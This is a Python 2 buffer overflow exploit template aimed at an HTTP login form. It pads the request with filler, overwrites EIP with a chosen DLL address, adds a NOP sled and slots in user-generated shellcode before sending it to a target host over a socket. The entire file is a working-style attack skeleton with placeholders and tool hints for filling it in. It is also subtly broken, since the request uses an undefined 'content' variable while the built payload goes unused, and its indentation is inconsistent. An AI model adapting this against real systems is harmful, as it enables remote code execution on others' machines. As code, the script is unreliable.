#!/usr/bin/python
# Exploit the buffer overflow
import socket

try:
	print "\nSending evil buffer…"
	
  # remember to add your own generated shellcode!!!!!
	shellcode = (
	"<shellcode>" )
	
	filler = "A" * <bytes> # byte size found with msf_pattern_offset tools
	eip = "<address>" # the reversed EIP memory address of the target DLL found with mona modules
	offset = "C" * 4 # adds CCCC to fill in the space between the EIP and ESP
	nops = "\x90" * 10
	
	inputBuffer = filler + eip + offset + nops + shellcode
	
	buffer = "POST /login HTTP/1.1\r\n"
	buffer += "Host: <TargetIP>\r\n"
	buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
	buffer += "Accept: text/html,application/xhtml,application/xml;q=0.9,*/*;q=0.8\r\n"
	buffer += "Accept-Language: en-US,en;q=0.5\r\n"
	buffer += "Referer: http:// <TargetIP>/login\r\n" #REMOVE SPACE IN URL
	buffer += "Connection: close\r\n"
	buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
	buffer += "Content-Length: "+str(len(content))+"\r\n"
	buffer += "\r\n"
	buffer += content
	
	s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
	s.connect(("<TargetIP>", <Port>))
	s.send(buffer)
	s.close()
  print "\nDone!"
